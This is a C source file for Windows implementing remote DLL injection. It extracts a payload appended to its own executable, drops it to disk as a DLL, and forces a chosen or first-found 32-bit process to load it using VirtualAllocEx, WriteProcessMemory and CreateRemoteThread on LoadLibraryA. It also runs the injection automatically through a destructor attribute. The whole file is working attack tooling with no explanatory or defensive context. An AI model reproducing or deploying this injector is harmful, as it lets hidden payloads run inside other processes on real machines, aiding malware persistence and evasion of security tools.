#include <windows.h>
#include <TlHelp32.h> 
#include <string.h>
#include <stdio.h>
#include "..\..\Shared\findProcess.c"
#include "..\..\Shared\payload.c"
#include "..\..\Shared\overlay.c"

typedef void* HANDLE;

void __attribute__ ((destructor)) remoteDllInjection(){
    int pid = 0;
    pid = findPidOf32BitProcess(0);
    
    if (pid == 0){
        perror("Injection failed. Process does not exist.\n");
        exit(EXIT_FAILURE);
    }

    struct Overlay overlay;
    overlay.overlayData = NULL;
    overlay.overlaySize = 0;
    getOverlay(&overlay);
    if(overlay.overlayData == NULL || overlay.overlaySize == 0){
        perror("Injection failed. Could not get overlay data.\n");
        exit(EXIT_FAILURE);
    }

    struct Payload payload;
    payload.payloadSize = overlay.overlaySize;
    payload.payloadData = overlay.overlayData;
    char *dllPath = (char *)dropPayloadOnDisk("remoteDllinjection.dll", payload);
    if (dllPath == 0){
        perror("Injection failed. DLL could not be created.\n");
        exit(EXIT_FAILURE);
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,0,pid);
    if (hProcess == INVALID_HANDLE_VALUE) {
        perror("Injection failed. Process could not be opened.\n");
        exit(EXIT_FAILURE);
    }
    

    int dllPathSize = strlen(dllPath);
    int *allocAddress;
    allocAddress = VirtualAllocEx(hProcess, NULL, dllPathSize + 1, MEM_COMMIT, PAGE_READWRITE);
    if(allocAddress == NULL){
        perror("Injection failed. Could not allocate memory in remote process.\n");
        exit(EXIT_FAILURE);
    }

    if (WriteProcessMemory(hProcess, allocAddress, dllPath, dllPathSize, NULL) == 0){
        perror("Injection failed. Could not write to remote process.\n");
        exit(EXIT_FAILURE);
    }

    FARPROC loadLibraryAddress = NULL;
    HMODULE hKernel32 = GetModuleHandle(TEXT("kernel32.dll"));
    if (hKernel32 != 0){
        loadLibraryAddress = GetProcAddress(hKernel32, "LoadLibraryA");
    }
    if (loadLibraryAddress == NULL){
        perror("Injection failed. Could not found LoadLibrary function.\n");
        exit(EXIT_FAILURE);
    }
    
    HANDLE hNewThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, allocAddress, 0, NULL);
    if(hNewThread == NULL){
        perror("Injection failed. Could not create remote thread.\n");
        exit(EXIT_FAILURE);
    }
    
    WaitForSingleObject(hNewThread, 200);

    if(VirtualFreeEx(hProcess, allocAddress, 0, MEM_RELEASE) == 0){
        perror("Injection failed. Could not free address in remote process.\n");
        exit(EXIT_FAILURE);
    }
    CloseHandle(hNewThread);
    CloseHandle(hProcess);
    puts("Injection successfull.");

}


int main(int argc, char *argv[]){
    char process[25];
    if (argc > 1){ 
        //first argument shoudl be taret process name or minimum process PID
        if(strlen(argv[1]) < 25){
            strcpy(process, argv[1]);
        }else{
            goto Default;
        }   
    }else{
        //default process name
        Default:process[0] = 0x30; // if no process name is provided, program injects dll to the fisrt 32 bit porcess found, this is bad on 32 bit OS because first processes are usually priviledges which could not be injected
        process[1] = 0x00;
    }

    remoteDllInjection(process);
    
    return 0;
}
